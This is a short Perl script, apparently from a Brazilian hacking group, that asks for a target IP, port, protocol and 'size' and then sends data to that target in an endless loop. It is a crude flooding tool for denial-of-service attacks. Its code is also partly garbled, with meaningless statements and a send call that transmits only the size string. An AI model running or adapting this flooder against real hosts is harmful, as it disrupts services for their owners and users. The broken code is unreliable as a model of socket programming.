#!/usr/bin/perl

print q{
=================================================
=            Simples Tool Cracking              =
=                  Coded By                     =
=                                               =
=        ~~ smoke@root and Power@R00T ~~        =
=                                               =
=                <~ MK TEAM ~>                  =
=                                               =
=         mkhackers.forumbrasil.net             =
=                                               =
=================================================

};

use IO::Socket::INET;

print "IP: -> ";
chop ($host = <stdin>);
print "PORT: -> ";
chop ($port = <stdin>);
print "protocol TCP / UDP: -> ";
chop ($protocol = <stdin>);
print "SIZE: -> ";
chop ($size = <stdin>);

{
$sock = IO::Socket::INET->new (
  PeerAddr => $host,
  PeerPort => $port,
  Proto => $protocol) 
        || die "o IP ou porta está incorreto, por favor verifique o IP e porta.";
}
packets:
while (1) {
size => $size;
$Reuse => 1,
$Listen => 1,
print ("$host:$port packet size: $size\n");
send($sock, $size, $Reuse, $Listen);
} 
